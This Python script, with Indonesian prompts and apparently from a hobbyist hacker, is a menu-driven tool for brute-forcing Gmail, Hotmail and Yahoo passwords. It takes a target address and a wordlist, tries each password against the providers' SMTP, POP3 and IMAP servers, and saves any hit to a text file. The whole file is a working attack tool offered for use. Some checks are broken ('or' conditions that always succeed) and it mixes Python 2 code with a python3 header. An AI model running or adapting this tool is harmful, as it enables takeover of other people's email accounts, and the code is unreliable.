#!usr/bin/python3.7
#Author: Elang X-CoderID
#contact: 0822475712**
#YouTube: Pangeran Alvins
#color
r="\033[31m"
g="\033[32m"
w="\033[1;37m"
c="\033[36m"
y="\033[33m"
white = '\033[1;37m' # White 
red = '\033[31m' # red
orange = '\033[33m' # orange
blue = '\033[34m' # blue
p  = '\033[35m' # purple
C  = '\033[36m' # cyan
try:
	import poplib, imaplib, smtplib, time, sys 
	from imaplib import IMAP4
	from poplib import POP3
except ImportError:
	exit("You Might be using Old version of Python. Please upgrade it First...!")

def bn_banner():
	print '====================================================='
	print 'EMAIL BRUTE HACK @PangeranAlvins'
	print '====================================================='+'\n\r\n\r'

def gm_banner():
	print """=============================================================
Gmail BRUTEFORCE
=============================================================\n\r"""

def hot_banner():
	print"""=============================================================
Hotmail BRUTEFORCE
=============================================================\n\r"""
	print 'Catatan: Ini hanya akan berfungsi jika akun hotmail memiliki POP3 Aktifkan ...!\n\r'

def yo_banner():
	print """=============================================================
Yahoo BRUTEFORCE
=============================================================
\n\r"""
def sorry():
	print "Maaf, Tidak ada kata sandi yang  ditemukan....!\n\r"
def exit():
	print '\n\r'+'Ini adalah versi publik. Untuk versi privat hubungi kami ...!\n\r'
	time.sleep(2)
	print './logout'
	sys.exit(1)
def gmail():
	user = raw_input("[#] Masukan Gmail: ")
	passlist= raw_input("[#] Password List [pass.txt]: ")
	fn = open (passlist, "r")
	counting = fn.readlines()
	print "[#] Jumblah Worldlist: %s " % len(counting)
	smtp_host = 'smtp.gmail.com'
	smtp_port = 465
	session = smtplib.SMTP_SSL()
	session.connect(smtp_host, smtp_port)
	#session.ehlo()
	#session.starttls()
	session.ehlo
	print "Mulai cracking menggunakan server gmail....\n\r"
	time.sleep(2)
	fn = open (passlist, 'r')
	for pass_file in fn:
		try:
			print "[#] Mencoba: {0}".format(pass_file)+"\n\r"
			y_g= session.login(user, pass_file[:-1])
			if (y_g == (235, '2.7.0 Accepted')):
				print "> Kata sandi  telah ditemukan....!\n\r"
				time.sleep(2)
				print "Email: {0}".format(user)+"\n\r"
				print "Password is: {0}".format(pass_file)+"\n\r\n\r\n\r"
				session.quit()
				fn.close()
				fw = open('Gmail.txt','w')
				fw.write(user+': '+pass_file)
				fw.close()
				print "Email dan assword saved tersimpan di Gmail.txt file.\n\r"
				exit()
		except smtplib.SMTPAuthenticationError:
			continue
def hotmail():
	user = raw_input("[#] Masukan Hotmail: ")
	passlist= raw_input("[#] Password List [pass.txt]: ")
	fn = open (passlist, "r")
	counting = fn.readlines()
	print "[#] Jumblah Worldlist: %s " % len(counting)
	host = 'pop3.live.com'
	port = 995
	server = poplib.POP3_SSL(host, port)
	print "Mulai cracking menggunakan server Hotmail.....\n\r"
	time.sleep(2)
	fn = open (passlist, 'r')
	for pass_file in fn:
		print "[#] Mencoba: {0}".format(pass_file)+"\n\r"
		pwd = pass_file[:-1]
		try:
			x = server.user(user)
			yy = server.pass_(pwd)
			if(yy == '+OK' or 'POP disabled'):
				print "> Kata sandi  telah ditemukan....!\n\r"
				time.sleep(2)
				print "Email: {0}".format(user)+"\n\r"
				print "Password is: {0}".format(pwd)+"\n\r\n\r\n\r"
				server.quit()
				fn.close()
				fw = open('Hotmail.txt','w')
				fw.write(user+': '+pwd)
				fw.close()
				print "Email dan password tersimpan di Hotmail.txt file.\n\r"
				exit()
		except poplib.error_proto:
			continue
def yahoo():
	user = raw_input("[#] Masukan Yahoo: ")
	passlist= raw_input("[#] Password List [pass.txt]: ")
	fn = open (passlist, "r")
	counting = fn.readlines()
	print "[+] Jumblah Worldlist: %s " % len(counting)
	host = 'imap.mail.yahoo.com'
	port = 993
	print "Mulai cracking menggunakan server Yahoo.....\n\r"
	time.sleep(2)
	fn = open (passlist, 'r')
	for pass_file in fn:
		try:
			session = imaplib.IMAP4_SSL(host, port)
			print "[#] Mencoba: {0}".format(pass_file)+"\n\r"
			y = session.login(user, pass_file[:-1])
			if (y == 'OK' or 'AUTHENTICATE completed'):
				print "> Kata sandi  telah ditemukan....!\n\r"
				time.sleep(2)
				print "Email: {0}".format(user)+"\n\r"
				print "Password is: {0}".format(pass_file)+"\n\r\n\r\n\r"
				session.logout()
				fn.close()
				fw = open('Yahoo.txt','w')
				fw.write(user+': '+pass_file)
				fw.close()
				print "Email dan password tersimpan di Yahoo.txt file.\n\r"
				exit()
		except IMAP4.error:
			continue
bn_banner()
while(1):
	print '''	        [01] .	Gmail
				
		[02] .	Hotmail
				
		[03] .	Yahoo
				
		[04] .	Exit \n\r'''
	choice=raw_input('[#] Pilih Nomor: ')
	if choice == '1':
		gm_banner()
		time.sleep(1)
		gmail()
		sorry()
		time.sleep(1)
	elif choice == '2':
		hot_banner()
		time.sleep(1)
		hotmail()
		sorry()
		time.sleep(1)
	elif choice == '3':
		yo_banner()
		time.sleep(1)
		yahoo()
		sorry()
		time.sleep(1)
	elif choice == '4':
		exit()
	else:
		print 'Masukan salah. Coba lagi...!\n\r'

